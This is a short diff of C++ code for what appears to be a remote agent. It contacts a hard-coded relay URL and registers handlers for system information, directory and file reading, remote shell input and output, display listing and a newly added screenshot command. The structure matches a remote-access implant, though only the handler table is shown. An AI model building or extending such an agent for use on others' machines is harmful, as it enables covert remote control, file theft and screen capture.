@@ -5,18 +5,19 @@
 
 INT32 start()
 {
-    auto url = "https://relay.nostdlib.workers.dev/agent"_embed;
+    const CHAR url[] = "https://relay.nostdlib.workers.dev/agent";
 
     Context context;
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
-    commandHandlers[CommandType::Command_GetSystemInfo] = EMBED_FUNC(Handle_GetSystemInfoCommand);
-    commandHandlers[CommandType::Command_GetDirectoryContent] = EMBED_FUNC(Handle_GetDirectoryContentCommand);
-    commandHandlers[CommandType::Command_GetFileContent] = EMBED_FUNC(Handle_GetFileContentCommand);
-    commandHandlers[CommandType::Command_GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);
-    commandHandlers[CommandType::Command_WriteShell] = EMBED_FUNC(Handle_WriteShellCommand);
-    commandHandlers[CommandType::Command_ReadShell] = EMBED_FUNC(Handle_ReadShellCommand);
-    commandHandlers[CommandType::Command_GetDisplays] = EMBED_FUNC(Handle_GetDisplaysCommand);
+    commandHandlers[CommandType::Command_GetSystemInfo] = Handle_GetSystemInfoCommand;
+    commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
+    commandHandlers[CommandType::Command_GetFileContent] = Handle_GetFileContentCommand;
+    commandHandlers[CommandType::Command_GetFileChunkHash] = Handle_GetFileChunkHashCommand;
+    commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
+    commandHandlers[CommandType::Command_ReadShell] = Handle_ReadShellCommand;
+    commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
+    commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
 
     while (1)
     {
